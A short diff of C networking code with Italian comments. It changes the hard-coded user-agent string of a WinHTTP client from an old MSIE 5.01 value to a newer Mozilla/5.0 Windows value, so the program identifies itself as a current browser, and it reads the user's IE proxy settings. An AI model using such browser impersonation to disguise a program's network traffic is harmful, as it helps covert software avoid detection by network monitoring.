@@ -655,7 +655,7 @@ BOOL H_ASP_WinHTTPSetup(char *server_url, char *addr_to_connect, DWORD buflen, D
 	ZeroMemory(&ProxyConfig, sizeof(ProxyConfig));
 
 	// Crea una sessione per winhttp.
-    hSession = FNC(WinHttpOpen)( L"Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)", WINHTTP_ACCESS_TYPE_NO_PROXY, 0, WINHTTP_NO_PROXY_BYPASS, 0);
+    hSession = FNC(WinHttpOpen)( L"Mozilla/5.0 (Windows NT 6.1; WOW64)", WINHTTP_ACCESS_TYPE_NO_PROXY, 0, WINHTTP_NO_PROXY_BYPASS, 0);
 
 	// Cerca nel registry le configurazioni del proxy
 	if (hSession && FNC(WinHttpGetIEProxyConfigForCurrentUser)(&ProxyConfig)) {
